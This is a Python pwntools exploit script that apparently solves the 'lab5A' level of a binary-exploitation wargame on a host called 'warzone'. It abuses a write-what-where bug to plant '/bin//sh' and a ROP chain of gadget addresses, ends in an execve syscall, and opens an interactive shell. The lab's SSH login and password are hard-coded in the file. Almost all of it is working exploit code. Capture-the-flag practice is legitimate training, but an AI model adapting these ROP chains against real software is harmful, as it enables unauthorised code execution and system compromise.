#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host warzone --user lab5A --pass th4ts_th3_r0p_i_lik3_2_s33 --path /levels/lab05/lab5A
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('lab5A')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'warzone'
port = int(args.PORT or 22)
user = args.USER or 'lab5A'
password = args.PASSWORD or 'th4ts_th3_r0p_i_lik3_2_s33'
remote_path = '/levels/lab05/lab5A'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

##################
# USEFUL STRINGS #
##################
SLASH_BIN = int("/bin"[::-1].encode('hex'),16)
SSLASH_SH = int("//sh"[::-1].encode('hex'),16)

WRITE_WHAT_WHERE = "store\n{inst}\n{index}\n"

##################
# USEFUL INDICES #
##################
EIP = -11

###########
# GADGETS #
###########
add_esp_60 = 0x080a50d0 # pivot
add_esp_4  = 0x0806c0a9 # hop
inc_ebx    = 0x080dbe61 # ebx += 1 [do this 4 times]
pop_ecx    = 0x080e6255 # use for ecx=0
pop_edx    = 0x0806f3aa # use for edx=0

add_al_0xA = 0x080dbf86 # al [0] += 0xa
inc_eax    = 0x0807be16 # al [0xa]++ (eax = 0xb)

syscall    = 0x08048eaa # int 0x80

############
# IO STUFF #
############
io = start()

log.info("Writing shell string")
io.send(WRITE_WHAT_WHERE.format(inst=SLASH_BIN,  index = 1))
io.send(WRITE_WHAT_WHERE.format(inst=SSLASH_SH,  index = 2))

log.info("Writing gadget get string into ebx")
io.send(WRITE_WHAT_WHERE.format(inst=add_esp_4,   index = 5)) # +1
io.send(WRITE_WHAT_WHERE.format(inst=inc_ebx,     index = 7)) 
io.send(WRITE_WHAT_WHERE.format(inst=add_esp_4,    index= 8))  # +2
io.send(WRITE_WHAT_WHERE.format(inst=inc_ebx,     index = 10)) 
io.send(WRITE_WHAT_WHERE.format(inst=add_esp_4,    index= 11)) # +3
io.send(WRITE_WHAT_WHERE.format(inst=inc_ebx,     index = 13))
io.send(WRITE_WHAT_WHERE.format(inst=add_esp_4,   index = 14)) # +4
io.send(WRITE_WHAT_WHERE.format(inst=inc_ebx,     index = 16))

log.info("Building ecx = NULL")
io.send(WRITE_WHAT_WHERE.format(inst=pop_ecx,    index = 17))

log.info("Building edx = NULL and eax = 0xb")
io.send(WRITE_WHAT_WHERE.format(inst=add_al_0xA, index = 19))
io.send(WRITE_WHAT_WHERE.format(inst=pop_edx,    index = 20))
io.send(WRITE_WHAT_WHERE.format(inst=inc_eax,    index = 22))

log.info("Writing syscal...")
io.send(WRITE_WHAT_WHERE.format(inst=syscall,    index = 23))

log.success("Triggering exploit...")
io.send(WRITE_WHAT_WHERE.format(inst=add_esp_60, index=EIP))

io.clean()

io.interactive()

